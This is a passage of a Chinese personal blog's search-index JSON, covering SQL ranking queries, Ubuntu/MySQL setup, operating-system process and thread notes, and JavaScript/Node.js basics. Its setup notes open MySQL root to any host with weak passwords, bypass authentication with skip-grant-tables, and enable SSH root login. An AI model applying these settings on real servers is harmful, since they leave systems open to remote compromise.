第二行括号内表示子查询中与父查询相同的表有多少个大于父查询的score，假设父查询的score为3.65，而此时的子查询表中，应该有(4.23,3.85,4.23)三个是大于3.65的，所以+1可以得到情况二的rank为4 区间查询某市建了一个新的体育馆，每日人流量信息被记录在gymnasium表中：序号 (id)、日期 (date)、 人流量 (visitors_flow)。 请编写一个查询语句，找出人流量处于高峰的记录 id、日期 date 和人流量 visitors_flow，其中高峰定义为前后连续三天人流量均不少于 100。 gymnasium表结构数据如下： id date visitors_flow 1 2019-01-01 58 2 2019-01-02 110 3 2019-01-03 123 4 2019-01-04 67 5 2019-01-05 168 6 2019-01-06 1352 7 2019-01-07 382 8 2019-01-08 326 9 2019-01-09 99 提示：每天只有一行记录，日期随着 id 的增加而增加。 基本思路：先找出三个连续日期人流量都是超过100的子表 123#找出三个刘旭日期人流量都是超过100的子表","categories":[{"name":"数据库","slug":"数据库","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"}]},{"title":"基础Linux操作","slug":"Linux/基础Linux操作","date":"2021-03-18T05:12:06.000Z","updated":"2021-04-05T06:42:10.000Z","comments":true,"path":"2021/03/18/Linux/基础Linux操作/","link":"","permalink":"http://example.com/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/","excerpt":"","text":"Centos安装时软件库 配置ubuntu18.04环境https://blog.csdn.net/longgeaisisi/article/details/78448525 web目录:/var/www/html 建立mysql数据库查找软件： sudo apt-cache search all | grep mysql 删除之前的版本sudo apt-get autoremove mysql* --purge 删除mysql所有的依赖 安装mysqlsudo apt-get install mysql-server mysql-common 设置远程登录netstat -an|grep 3306 查看端口3306是否打开 其中可以到127.0.0.1:3306只允许本地登录 修改mysql配置文件vi /etc/mysql/mysql.conf.d/mysqld.cnf 注释掉bind-address = 127.0.0.1 重启服务： 关掉mysql服务：sudo /etc/init.d/mysql stop 启动mysql服务：sudo /etc/init.d/mysql start 并且设置允许root用户远程访问： 12345678# 指定root用户的Host字段为%use mysql # 切换到数据库mysqlselect user,host from user; # 查询user表中数据update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;; # 修改root账号的host字段为：% # 给任意主机root账户连接mysql服务器权限：GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27; WITH GRANT OPTION;flush privileges; # 刷新权限表，使配置生效 mysql5.7设置密码登陆 命令行密码不能登陆，到配置文件设置跳过密码登录 1vim /etc/mysql/mysql.conf.d/mysqld.cnf 打开该文件 在 [mysqld]下添加 skip-grant-tables，此行代码意味着跳过密码登陆 然后后保存，重启服务 sudo /etc/init.d/mysql restart 1234user mysql;//update user set password=password(&#x27;123&#x27;) where user=&#x27;root&#x27;;mysql5.7密码字段已经够改了 需要换成authentication_string update user set authentication_string=password(&#x27;密码&#x27;) where user=&#x27;root&#x27;; 然后注释掉前面的配置即可登陆成功 mysql8.0设置下载MySQL提供的套件管理设定档至/tmp资料夹： 1$ curl -OL https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb 下载完成后，.deb的软体套件包需以dpkg指令安装： 1234$ sudo dpkg -i mysql-apt-config* #选择8.0版本$ sudo apt-get update$ sudo apt-get install mysql-server #安装命令$ service mysql status #查看运行状态 12345678910root@iZbp17jdvnw88dzg0be3y7Z:/tmp# service mysql status● mysql.service - MySQL Community Server Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2021-03-18 18:07:43 CST; 12s ago Main PID: 9208 (mysqld) Status: &quot;Server is operational&quot; Tasks: 38 (limit: 2318) Memory: 331.5M CGroup: /system.slice/mysql.service └─9208 /usr/sbin/mysqld 安装密码强度验证插件插件 y 设置密码强度安全等级 修改root访问权限 是否禁止root远程登录 移除匿名用户 可移除测试数据库 设置完成重新加载安全表 1234567Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27;mysql -u rootmysql&gt; use mysql;mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;Current-Root-Password&#x27;;mysql&gt; FLUSH PRIVILEGES;Query OK, 0 rows affected (0.00 sec) 增加远端访问，主要在%号 1mysql&gt; CREATE USER &#x27;newuser&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;12345678&#x27;; 赋予newuser所有的资料库权限： 12mysql&gt; GRANT ALL PRIVILEGES ON *.* TO &#x27;newuser&#x27;@&#x27;%&#x27;;mysql&gt; FLUSH PRIVILEGES; 以及更上面一样注释监听端口 下载python安装pythonapt-get install python 安装pip安装低版本的pip： sudo apt-get install python-pip 然后根据网上的命令 python -m pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple/ 更新完后出现了各种错误，经过各种尝试之后发现这个应该是windows才能用的更新 此时再次卸载掉pip之后 sudo apt-get --purge remove python-pip 再用上面的命令重装后，还是同样的错误，经过尝试，需要到 将该目录下的配置文件全部删除rm -r *再进行重装 12345678910111213# 删除软件及其配置文件apt-get --purge remove &lt;package&gt;# 删除没用的依赖包apt-get autoremove &lt;package&gt;# 此时dpkg的列表中有“rc”状态的软件包，可以执行如下命令做最后清理：dpkg -l |grep ^rc|awk &#x27;&#123;print $2&#125;&#x27; |sudo xargs dpkg -P# 当然如果要删除暂存的软件安装包，也可以再使用clean命令。apt-get clean &lt;package&gt;安装2版本的pip`https://bootstrap.pypa.io/pip/2.7/get-pip.py``python get-pip.py` python2安装pymysql12345671、下载pymysql包wget https://files.pythonhosted.org/packages/44/39/6bcb83cae0095a31b6be4511707fdf2009d3e29903a55a0494d3a9a2fac0/PyMySQL-0.8.1.tar.gz2、解压tar -zxvf PyMySQL-0.8.1.tar.gz3、安装进入PyMySQL-0.8.1目录,执行：python2 setup.py install 查询命令opkg -l | grep &quot;xxx&quot; ‘ascii’ codec can’t encode执行python时使用了ascii编码 PYTHONIOENCODING=utf-8 nohup python3 -u querydianfei.py &gt; dianfei.out &amp; 后台执行命令root用户支持远程访问修改/etc/ssh/sshd_config 文件 123456将 PermitRotLogin without-password 修改为 PermitRootLogin yes，如下：# Authentication:LoginGraceTime 120PermitRootLogin yesStrictModes yes可以成功登陆了。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"1.进程与线程","slug":"操作系统/1.进程与线程","date":"2021-03-15T09:43:34.000Z","updated":"2021-05-22T06:45:04.000Z","comments":true,"path":"2021/03/15/操作系统/1.进程与线程/","link":"","permalink":"http://example.com/2021/03/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1.%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"进程进程的定义 进程是指一个具有一定独立功能的程序在一个数据集合上的一次动态执行的过程 进程的特点：动态性、并发性、独立性、制约性 程序=文化（静态的可执行文件） 进程=执行中的程序=程序+执行状态 进程控制块描述和控制进程运行的数据结构：**进程控制块PCB(Process Control Block)**，是操作系统中最重要的记录型数据结构。 操作系统用PCB来描述进程的基本情况以及运行的变化过程 PCB是进程存在的唯一标志、每个进程在操作系统中都有一个对应的PCB 进程控制块的使用：进程的创建、终止、组织管理 进程控制块的内容：进程的标识信息、处理机现场保存、进程控制信息 进程控制块的组织方式：线性方式、链接方式、索引方式 进程的三种基本状态由于多个进程在并发执行时共享系统资源，致使它们在运行过程中呈现间断性的运行规律，所以进程在其生命周期内可能具有多种状态。一般而言，每一个进程至少应处于以下三种基本状态之一： 就绪(Ready)状态进程已获得所有必要资源，处于准备好运行的状态，只要获得CPU，就可以立即执行； 执行(Running)状态​ 进程已经获得CPU，其程序正在执行； 阻塞(Block)状态​ 进程由于需要等待某种事件或者某种资源，暂时无法继续执行； 进程在运行过程中会经常发生状态的转换。例如，处于就绪状态的进程，在调度程序为之分配了处理机之后便可执行，相应地，其状态就由就绪态转变为执行态；正在执行的进程(当前进程)如果因分配给它的时间片已完而被剥夺处理机暂停执行时，其状态便由执行转为就绪；如果因发生某事件，致使当前进程的执行受阻(例如进程访问某临界资源，而该资源正被其它进程访问时)，使之无法继续执行，则该进程状态将由执行转变为阻塞。 初始状态 变换状态 操作 就绪 执行 系统调用 执行 就绪 时间片用完之后，系统将其调入就绪队列，等待下次调用 执行 阻塞 等待IO调用，或者类似sleep( )函数的等待（阻塞是进程自身主动行为） 阻塞 就绪 只能被别的进程或者操作系统唤醒，并不会由于自身的原因进入就绪队列（唤醒） 唤醒进程的情况：被阻塞进程需要的资源可被满足、被阻塞的进程等待的时间到达 进程挂起模型进程挂起处在挂起状态的进程映像在磁盘上，目的是减少进程所占用内存 挂起操作后三个进程状态的转换挂起：把一个进程从内存转到外存；激活：把一个进程从外存转到内存 初始状态 变换状态 操作 活动就绪（处于未被挂起的就绪状态） 静止就绪（挂起的就绪状态） 挂起 活动阻塞（处于未被挂起的阻塞状态） 静止阻塞（挂起的阻塞状态） 挂起 静止就绪 活动就绪 激活 静止阻塞 活动阻塞 激活 其中阻塞的外部进入状态只能从执行-&gt;活动阻塞；并且其的静止阻塞也是可以到静止就绪 进程控制1.操作系统内核1.定义通常将处理机的执行状态分成系统态和内核态；系统态又称为管态、内核态，具有较高特权，能执行一切指令，访问所有寄存器和存储区，传统的OS都在系统态运行。 2.内核支撑功能： 中断处理：中断处理使内核最基本的功能，是整个操作系统赖以活动的基础， 为提高程序执行的并发性，内核在对中断”有限处理”后，便转入相关的进程，由这些进程继续完成后续的处理工作。 时钟管理：时间管理是内核一项基本功能，在时间片轮转的调度中，每当时间片用完时，便由时间管理产生一个中断信号，促使调度程序重新进行调度。 原语操作：所谓原语，就是若干条指令组成的，用于完成一定功能的一个过程，它与一般过程的区别在于”原子操作“。就是要么一起做，要么一个都不做，原语操作在执行过程中不允许被中断。原子操作在系统态下执行，常驻内存。 3.资源管理功能：进程管理、存储器管理、设备管理 进程的操作1.进程创建 申请空白PCB 为新进程分配其运行所需的资源，包括物理和逻辑资源 初始化进程控制块 如果进程就绪队列能够接纳新进程，便将新进程插入就绪队列 2.进程的终止3.进程的阻塞和唤醒1.引起进程的阻塞和唤醒的事件（block和wakeup） 向系统请求共享资源失败。 等待某种操作的完成 新数据尚未到达 等到新任务到达 2.进程阻塞过程正在执行的进程，进入阻塞后，通过阻塞原语block操作将自己阻塞，所以，阻塞是进程自身的主动行为。 3.进程唤醒过程当被阻塞进程所期待的事件发生时，则由有关进程调用唤醒*原语wakeup***，将等待该时间的进程唤醒。 4.进程的挂起和激活（suspend和active）都是操作系统内核的调用 进程的同步 进程同步主要是使得执行的各个进程能按照一定的规则和时序共享系统资源。 1.两种形式的制约关系 间接相互制约关系：多个程序在并发执行时，由于共享系统资源，如CPU和IO设备等，致使这些并发执行的程序之间相互形成了制约关系。 直接相互制约关系 2.临界资源打印机、io设备等等 3.临界区每个进程中访问临界资源的那段代码称为临界区 4.同步机制遵循的规则空闲让进、忙则等待、有限等待、让权等待 5.硬件同步机制1.关中断：进入所测试之前关闭中断，直至锁测试完成上锁之后打开中段，进程在临界区执行期间，os不响应中断，不会引起调度，也就不会发生进程或者线程的切换，从而保证了对锁的测试和关锁操作的连续性和完整性。 2.利用Test-and-Set指令实现互斥 1234567891011121314boolean TS(boolean *lock)&#123;//lock有两种状态， lock=FALSE 表示资源空闲 lock=TRUE 表示资源正在被使用 Boolean old; old=*lock; *lock=TRUE; //如果资源没上锁，那就将资源上锁 return old; //返回资源之前的状态&#125;do&#123;···while TS(&amp;lock) ; // 必须将资源循环测试到TS(s)=FALSE，其实质就是自身进程能将临界资源上锁 critical section;//临界区操作 lock=FALSE; remainder section;&#125;while(TRUE) 3.使用Swap指令实现进程互斥 1234567891011121314151617void swap(boolean *a,boolean *b)&#123; boolean tmp; tmp=*a; *a=*b; *b=tmp; &#125;do&#123; key=TRUE; do&#123; swap(&amp;lock,&amp;key); &#125;while(key!=FALSE);//如果key==false代表交换成功，即拿到了资源 //临界区操作 lock=FALSE; ···&#125;while(TRUE); 利用以上的硬件指令能够有效地实现进程互斥，但当临界志愿忙碌时，其他访问进程必须不断地进行测试，处于忙等的状态，不符合让权等待的原则。 6.信号量机制1.整型信号量 2.记录型信号量 3.AND信号量 当一个进程需要获得两个或更多的共享资源后能执行其任务，假定有AB两个进程，都要求访问共享数据DE，共享数据都应作为临界资源，可为这两个数据分别设置用于互斥的信号量Dmutex和Emutex，初值都为1 最后进程都不能执行下去了，此时AB进入死锁，所以需要在wait操作中增加一个AND条件，或称为同时wait操作 4.信号量集 5.信号量的操作 由一个整型变量和两个原子操作组成，整型变量代表其中有多少个 PV操作，P增加、V减少 在执行的过程P( )可能阻塞，V( )不会阻塞 12345678910111213141516171819class Semaphore&#123; int sem; WaitQueue q; //阻塞队列&#125;Semaphore::P( )&#123; sem--; if(sem&lt;0)&#123; //x小于0代表资源已经被占用 //将进程加到阻塞队列中 block(p); &#125;&#125;Semaphore::V( )&#123; sem++; if(sem&lt;=0)&#123;//如果加完小于等于0，则代表已经有进程进入阻塞队列 //将线程移出阻塞队列 wakeup(p); &#125;&#125; 6.信号量实现前趋关系 7.管程机制1.定义 硬件资源和软件资源可用数据结构抽象地描述其资源性，即用少量信息和对该资源所执行的操作来表征该资源，利用共享数据结构抽象地表示系统中的共享资源，并且对共享数据结构的特定操作定义为一组过程。进程对共享资源的申请，释放和其他操作必须通过这组过程，间接对共享数据结构实现操作。对于请求访问共享资源的并发进程，可以根据资源的情况接受或阻塞，确保每一次仅有一个进程进入管程。 代表共享资源的数据结构以及对该共享数据结构实施操作的一组过程所组成的资源管理程序共同构成了一个操作系统的资源管模块，称之为管程，管程被请求和释放的资源的进程所调用。 2.组成内容： 管程名称 局部于管程的共享数据结构说明 对该数据结构进行操作的一组过程（函数） 对局部于管程的共享数据设置初始值 3.条件变量 利用管程实现进程同步时，必须设置同步工具，如两个同步操作原语wait和signal，管程中对每个条件变量都必须说明，其形式condition x，y；对条件变量的操作仅仅是wait和signal。同时提供两个操作可表示为x.wait和x.signal 8.用两种方法解决生产者消费者问题1.使用记录型信号量 1234567891011121314151617181920212223242526272829303132333435//mutex表示进程对缓冲区的互斥使用。empty和full分别表示缓冲池中空缓冲区和满缓冲区的数量//buffer表示偶n个缓冲区，其中子项为item//in、out代表第一个资源和最后一个资源int in=0,out=0;item buffer[n];semaphore mutex=1,empty=n,full=0;void proceducer()&#123; do&#123; producer an item nextp;//生产一个产品 ··· wait(empty);//等待缓冲区有空闲位置，没满进入，满了继续等待 wait(mutex);//如果正在被占用则等待 保证互斥曹组 buffer[in]=nextp;//将新资源放到buffer[in]位置 in=(in+1)%n; signal(mutex);//释放互斥 signal(full);//将信号量+1，表示填入一个 &#125;while(TRUE);&#125;void consumer()&#123; do&#123; wait(full);//是否缓冲区不为空，不为空的话继续执行，为空就一直等待 wait(mutex); nextc=buffer[out]; out=(out+1)%n; signal(mutex); signal(empty); consumer the item in nextc; ··· &#125;while(TRUE);&#125;void main()&#123; cobegin proceducer( ); consumer( ); coend&#125; 2.使用管程 进程间的通信1.共享存储器系统2.管道通信系统 3.消息传递系统 线程线程—作为调度和分派的基本单位1.调度的基本单位线程作为调度和分派的基本单位，而进程作为资源拥有的基本单位；同一进程中，线程的切换不会引起进程的切换； 2.并发性线程之间可并发执行，最大化提升单进程的吞吐能力； 3.拥有资源进程的资源可以被自己的线程共享使用；线程一般不独占资源； 4.独立性同一进程产生的线程可以共享资源，独立性弱； 5.系统开销进程高、线程低； 6.支持多处理机系统多线程可以充分利用多个处理机，并发执行； 线程的状态和线程控制块1.线程运行的三个状态与传统的进程一样，在各线程之间也存在着共享资源和相互合作的制约关系，致使线程在运行时也具有间断性。相应地，线程在运行时也具有下述三种基本状态： (1) 执行状态，表示线程已获得处理机而正在运行； (2) 就绪状态，指线程已具备了各种执行条件，只须再获得CPU便可立即执行； (3) 阻塞状态，指线程在执行中因某事件受阻而处于暂停状态，例如，当一个线程执行从键盘读入数据的系统调用时，该线程就被阻塞。 2.线程控制块TCB如同每个进程有一个进程控制块一样，系统也为每个线程配置了一个线程控制块TCB，将所有用于控制和管理线程的信息记录在线程控制块中。 线程标识符、一组寄存器（ 通用寄存器、程序计数器PC、状态寄存器）、线程运行状态、优先级、线程专有存储区、信号屏蔽、堆栈指针 线程的实现1.线程的创建应用程序在启动时，通常仅有一个线程在执行，人们把线程称为“初始化线程”，它的主要功能是用于创建新线程。在创建新线程时，需要利用一个线程创建函数(或系统调用)，并提供相应的参数，如指向线程主程序的入口指针、堆栈的大小，以及用于调度的优先级等。在线程的创建函数执行完后，将返回一个线程标识符供以后使用。 2.线程的终止当一个线程完成了自己的任务(工作)后，或是线程在运行中出现异常情况而须被强行终止时，由终止线程通过调用相应的函数(或系统调用)对它执行终止操作。但有些线程(主要是系统线程)，它们一旦被建立起来之后，便一直运行下去而不被终止。在大多数的OS中，线程被中止后并不立即释放它所占有的资源，只有当进程中的其它线程执行了分离函数后，被终止的线程才与资源分离，此时的资源才能被其它线程利用。 进程线程编程实验1.创建子进程实验对于父进程，fork()函数返回子进程的进程号，而对于子进程，fork()函数则返回0。因此，通过fork()函数的返回值可以判定该进程是父进程还是子进程。 1234567891011121314//通过父进程创建一个子进程pid_t p1,p2,p3;p1=getpid();while((p2=fork())==-1);if(p2 == 0)&#123; printf(&quot;进入进程2\\n&quot;); printf(&quot;我是第二个进程，id为%d，父进程为%d\\n&quot;,getpid(),getppid());&#125;sleep(2);while((p3=fork())==-1);if(p3 ==0 &amp;&amp; getppid()==p1)&#123; printf(&quot;进入进程3\\n&quot;); printf(&quot;我是第三个进程，id为%d，父进程为%d\\n&quot;,getpid(),getppid());&#125; 2.在子进程中创建线程在子进程中创建线程，每个线程执行不同的函数 123456789101112131415161718192021222324252627pid_t p1,p2,p3;p1=getpid();if(p2!=0) while((p2=fork())==-1);if(p2 == 0)&#123; pthread_t tid1, tid2; //定义两个线程i; int ret1,ret2; printf(&quot;进入进程2\\n&quot;); printf(&quot;我是第二个进程，id为%d，父进程为%d\\n&quot;,getpid(),getppid()); int n=23;//打印两次helloworld int n2=3; ret1 = pthread_create(&amp;tid1, NULL, (void*)print_prime, &amp;n);//传入的参数为void *类型，然后，再将int num=*(int *)n; if(ret1 == 0) printf(&quot;创建第一个线程成功\\n&quot;); else printf(&quot;创建第一个线程失败!\\n&quot;); ret2=pthread_create(&amp;tid2,NULL,(void*)Fibonacci,&amp;n2); if(ret2 == 0) printf(&quot;创建第二个线程成功\\n&quot;); else printf(&quot;创建第二个线程失败!\\n&quot;); pthread_join(tid1, NULL);//等待线程执行完成 pthread_join(tid2, NULL);//等待线程执行完成 &#125;void print_prime(void* max_void)&#123; ······&#125; 3.在子进程中执行不同的程序123456789101112131415161718pid_t p4=10,p5=10;if(p4!=0)&#123; printf(&quot;执行创建进程p4\\n&quot;); while((p4=fork())==-1); if(p4==0)&#123; printf(&quot;创建进程4成功，id为%d，父进程为%d\\n&quot;,getpid(),getppid()); &#125;&#125;if(p4==0)&#123; int ret; ret=execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-lh&quot;, NULL); printf(&quot;ret%d&quot;,ret); if(ret &lt; 0)&#123; printf(&quot;执行ls -l出错&quot;); &#125;else&#123; printf(&quot;成功在进程4中执行ls -l命令\\n&quot;); &#125;&#125; 其中excel( )在子进程中执行，为覆盖掉原来的程序，所以第二个if里只执行ls -lh 进程间的通信","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Python-Josn格式的处理","slug":"Python/Python-Josn格式的处理","date":"2021-03-13T13:42:40.000Z","updated":"2021-03-16T08:03:08.000Z","comments":true,"path":"2021/03/13/Python/Python-Josn格式的处理/","link":"","permalink":"http://example.com/2021/03/13/Python/Python-Josn%E6%A0%BC%E5%BC%8F%E7%9A%84%E5%A4%84%E7%90%86/","excerpt":"","text":"1.mysql不存在插入存在不插入1INSERT INTO info(goods_id,goods_store,goods_name,goods_oriPrice,goods_killPrice,goods_url,stoptime)SELECT &#x27;1000282702&#x27;,&#x27;美的京东自营官方旗舰店&#x27;,&#x27;美的（Midea）家用多功能风炉烤箱32L 独立控温 搪瓷内胆 解冻发酵电烤箱T3-L324D二代&#x27;,&#x27;429.0&#x27;,&#x27;358.0&#x27;,&#x27;http://item.jd.com/5248778.html&#x27;,1615867199000 from dual where not exists (select * from info where goods_id=&#x27;1000282702&#x27;); INSERT INTO 表名(表项，表项···)SELECT &#39;值&#39; &#39;值&#39;··· from dual where not exists (select * from 表名 where 表项=值) 2.python2安装pymysql模块https://blog.csdn.net/qq_31024251/article/details/113758704?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_v2~rank_aggregation-3-113758704.pc_agg_rank_aggregation&amp;utm_term=python2%E5%AE%89%E8%A3%85pymysql&amp;spm=1000.2123.3001.4430","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"JavaScript开发","slug":"JavaScript/JavaScript开发","date":"2021-03-11T05:22:53.000Z","updated":"2021-04-01T14:03:26.000Z","comments":true,"path":"2021/03/11/JavaScript/JavaScript开发/","link":"","permalink":"http://example.com/2021/03/11/JavaScript/JavaScript%E5%BC%80%E5%8F%91/","excerpt":"","text":"闭包与变量锁定闭包=内部函数+外部代码（外部函数变量） 123456789101112131415function stopWatch()&#123; var starttime=Date.now() function getDelay()&#123; var usingtime=Date.now()-starttime; alert(usingtime); &#125; return getDelay; &#125; //先调用整个函数，然后变量拿到getDelay的入口 var timer=stopWatch(); for(var i=0;i&lt;1000000;i++)&#123; var foo=Math.random()*10000; &#125; //最后使用getDealy入口显示延迟时间 此时的starttime并没有被消灭 timer(); 在闭包内可以使用共有的变量 123456789101112131415function tmp(names)&#123; var qutos=[]; for(var i=0;i&lt;names.length;i++)&#123; var thefun=function()&#123; return &quot;my name is &quot;+names[i]+&quot;!&quot;; &#125; //此时的thefun没有运行，只是记录下thefun的地址，里面的i还没被锁定，只是复制外面i的地址， qutos.push(thefun); &#125; return qutos;&#125;var people=[&quot;tony&quot;,&quot;mike&quot;,&quot;jecke&quot;];var quto_arry=tmp(people);var person=quto_arry[0];alert(typeof(person)); 运行结果： 原因是在立即执行函数里面，names[i]里面的i为引用，相当于c语言的深拷贝，所以运行到最后，quto_arry里面应该的i都为4，因为循环结束的i为4 123456789101112131415161718function tmp(names)&#123; var qutoes=[]; for(var i=0;i&lt;names.length;i++)&#123; (function(index)&#123; var theFunction=function()&#123; return &quot;My name is&quot;+names[index]+&quot;!&quot;; &#125; qutoes.push(theFunction); &#125;)(i); return qutoes; &#125;&#125;var people=[&quot;tony&quot;,&quot;mike&quot;,&quot;jecke&quot;];var quto_arry=tmp(people);var person=quto_arry[0];alert(person()); 运行结果： 变量i作为立即函数的参数输入，这里的参数index引用到了立即函数内部， 变量i成为了函数内部的变量，之前作为外部的变量的i被锁定了，类似于重新复制了一份，外部的i不会影响函数内的i 文档对象模型DOMDOM结构不止有HTML元素，用一个更上层的概念来说，所有组成DOM结构的东西被称作节点。 这些节点可以是HTML元素、属性、文本内容、注释、与文件相关的内容。’ DOM的最顶层由window、document、html三个元素组成 window对象DOM结构的根节点就是window对象，这个window对象包含许多作用浏览器的属性和方法，window对象处理的是浏览器窗口 Document对象document对象是通往构成网页HTML元素的大门，需要记住的是document对象并非只能访问HTML只读文件，可以通过document对象对HTML文件进行读取和编辑。","categories":[{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/categories/NodeJs/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"}]},{"title":"JavaScript-Node.js开发","slug":"JavaScript/JavaScript-NodeJs开发","date":"2021-03-07T03:44:18.000Z","updated":"2021-04-01T14:02:56.000Z","comments":true,"path":"2021/03/07/JavaScript/JavaScript-NodeJs开发/","link":"","permalink":"http://example.com/2021/03/07/JavaScript/JavaScript-NodeJs%E5%BC%80%E5%8F%91/","excerpt":"","text":"使用webStorm编写第一个Node.js程序123456var http=require(&#x27;http&#x27;);console.log(&quot;请打开浏览器&quot;);http.createServer(function (req,res) &#123; res.end(&#x27;hello wolrd&#x27;); console.log(&quot;服务器正常&quot;);&#125;).listen(3000,&#x27;127.0.0.1&#x27;); JavaScript的数据类型数值型字符串型程序中的字符串型数据是包含在单引号或双引号中的，由单引号定界的字符串中可以含有双引号，由双引号定界的字符串中也可以含有单引号 Node.js全局对象全局变量_filename表示当前正在执行的脚本的文件名它将输出所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。如果在模块中，返回的值是模块文件的路径。 _dirname表示当前执行脚本所在的目录。 全局对象console对象console对象用于提供控制台的标准输出 consolo对象常见的方法 方法名称 方法说明 log() 向标准输出流打印字符并以换行符结束，该方法接收若干个参数，如果只有一个参数，则输出这个参数的字符串形式。如果有多个参数，则类似于C语言的printf()命令格式输出 time() 输出时间，表示计时开始 timeEnd() 结束时间，表示计时结束 process对象process对象用于描述当前程序的状态，与console对象不用的是，process对象只是在node.js中存在的对象，在JavaScript中并不存在这个对象。 process对象中的基本属性 属性名称 说明 argv 返回一个数组，由命令行执行脚本时的各个参数组成 env 返回当前系统的环境变量 version 返回当前node.js的版本 arch 返回当前cpu的架构，如“arm”或“x64” platform 返回当前运行程序所在的平台系统，如“win32”或“Linux” exit(code) 使用指定的code的结束进程，如果忽略，将会使用code() memoryUsage() 返回一个对象，描述了Node进程所用的内存状态，单位为字节 uptime() 返回Node已经运行的秒数 Node.js全局函数Node.js全局函数 函数名称 说明 setTimeout(cb,ms) 在指定的毫秒数后执行指定的函数。指定时间后，只执行一次 clearTimeout(t) 停止一个之前调用setTimeout()创建的定时器 setInterval(cb,ms) 在指定的毫秒(ms)数后指定函数(cb)。指定时间后，周期循环执行 模块化编程exports对象module.js 1234567exports.abs=function (number) &#123; if(number&gt;0)&#123; return number; &#125;else&#123; return -number; &#125;&#125;; main.js 12var module=require(&#x27;./module&#x27;);console.log(&#x27;abs(-273)=%d&#x27;,module.abs(-273)); module对象Node.js 提供了 exports 和 require 两个对象，其中 exports 是模块公开的接口，require 用于从外部获取一个模块的接口，即所获取模块的 exports 对象。 使用exports进行模块化编程hello.js 123exports.hello = function() &#123; console.log(&#x27;Hello World&#x27;);&#125; hello.js 通过 exports 对象把 world 作为模块的访问接口，在 main.js 中通过 require(‘./hello’) 加载这个模块，然后就可以直接访 问 hello.js 中 exports 对象的成员函数了。 在main.js使用该模块的函数 12var tmp=require(&#x27;./hello&#x27;);tmp.hello(); 使用module对象进行模块化编程1234567891011//hello.js function Hello() &#123; var name; this.setName = function(thyName) &#123; name = thyName; &#125;; this.sayHello = function() &#123; console.log(&#x27;Hello &#x27; + name); &#125;;&#125;;module.exports = Hello; 12345//main.js var Hello = require(&#x27;./hello&#x27;);hello = new Hello();hello.setName(&#x27;BYVoid&#x27;);hello.sayHello(); 模块接口的唯一变化是使用 module.exports = Hello 代替了exports.hello = function(){}。 在外部引用该模块时，其接口对象就是要输出的 Hello 对象本身，而不是原先的 exports。 包与安装在www.npmjs.com网站上找到对应的包 npm install 包名@x.x.x --save 异步编程回调函数回调函数在完成任务后就会被调用，Node 使用了大量的回调函数，Node 所有 API 都支持回调函数。 例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。 1234567891011121314var a=0function fooA(x)&#123; console.log(a)&#125;function time(time)&#123; setTimeout(function()&#123; a=4 console.log(&quot;执行定时程序&quot;) &#125;,time) console.log(&quot;跳出时间函数&quot;)&#125;console.log(a)time(3000);fooA(a); 其中setTimeout()函数为回调函数，“跳出时间函数”不会等执行完再执行，运行结果： 12345678910111213141516var a=0function fooA(x)&#123; console.log(a)&#125;function time(time,callback)&#123; setTimeout(function()&#123; a=4 console.log(&quot;执行定时程序以及回调函数&quot;) callback(a) &#125;,time) console.log(&quot;跳出时间函数&quot;)&#125;console.log(a)time(3000,fooA); http模块server对象server对象中的方法server对象中主要使用的方法有listen()方法和close()方法，分别控制服务器的启动和关闭 server对象中的事件在server对象中，事件比方法更重要。因为server独享集成了EventEmitter对象，自然可以添加监听对象 server对象中主要的监听对象 事件名称 说明 request 客户端请求触发 connection 客户端连接时触发 close 服务器关闭时触发 checkContinue 客户端持续连接时触发 upgrade 客户端请求http升级时触发 clientError 客户端发生错误时触发 response对象response对象提供了writeHead()方法和end()方法 添加网页12345678910111213var http=require(&#x27;http&#x27;);var fs=require(&#x27;fs&#x27;)var server=http.createServer(function (request,response)&#123; fs.readFile(&#x27;index.html&#x27;,function (error,data)&#123; response.writeHead(200,&#123;&#x27;Content-Type&#x27;:&#x27;text/html&#x27;&#125;); response.end(data); &#125;);&#125;).listen(52222,function ()&#123; console.log(&quot;服务器的地址····&quot;);&#125;); 添加视频添加视频将index.html换成xxx.mp4，Content-Type换成”video/mp4” 1234567891011121314151617181920212223242526272829303132var http=require(&#x27;http&#x27;);var fs=require(&#x27;fs&#x27;);var server=http.createServer();var port=22222;server.listen(port,function () &#123; console.log(&quot;启动服务端&quot;);&#125;);server.on(&#x27;request&#x27;,function (req,res)&#123; console.log(&quot;接受访问&quot;); var filename=&quot;demo.MP4&quot;; var 